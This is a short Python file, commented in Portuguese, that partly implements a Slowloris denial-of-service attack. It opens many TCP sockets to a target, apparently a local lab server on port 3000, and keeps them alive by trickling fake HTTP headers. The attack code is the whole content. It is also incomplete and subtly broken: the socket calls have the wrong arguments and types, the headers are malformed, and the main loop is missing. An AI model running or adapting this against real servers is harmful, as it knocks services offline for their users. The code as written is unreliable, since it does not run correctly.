# implementação simples do ataque slowloris

import socket
import time
import random

# headers de usuario e linguagem, pois em servidores reais a requisição nem passa se não tiver isso
# apesar de que no nosso servidor não tenha essa verificação
HEADERS = [
    b"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
    b"pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"
]
lista_sockets = []

HOST_ALVO = "127.0.0.1" # localhost
PORTA_ALVO = 3000

def init_socket():
    #cria socket TCP IPv4 na rede local, com timeout de 10 segundos
    socket_atck = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    socket_atck.settimeout(10)

    # conecta o socket ao host que vai ser atacado
    socket_atck.connect(HOST_ALVO, PORTA_ALVO)

    # aqui coloca o pacote inicial 
    if socket_atck:
        try:
            socket_atck.send(f"GET /?{random.randint(0, 3000)} HTTP/1.1\r\n")
            for header in HEADERS:
                socket_atck.send(header)
        except OSError:
            socket_atck.close()
            socket_atck = None

    return socket_atck

def enviar_header(socket_atck):
    if socket_atck:
        try:
            string = f"X-a: {random.randint(1, 5000)}\r\n"
            socket_atck.send(string.encode("utf-8"))
        except OSError as err:
            print(f"erro de socket: {err} matando socket")
            socket_atck.close()
            lista_sockets.remove(socket_atck)


# implementação slowloris
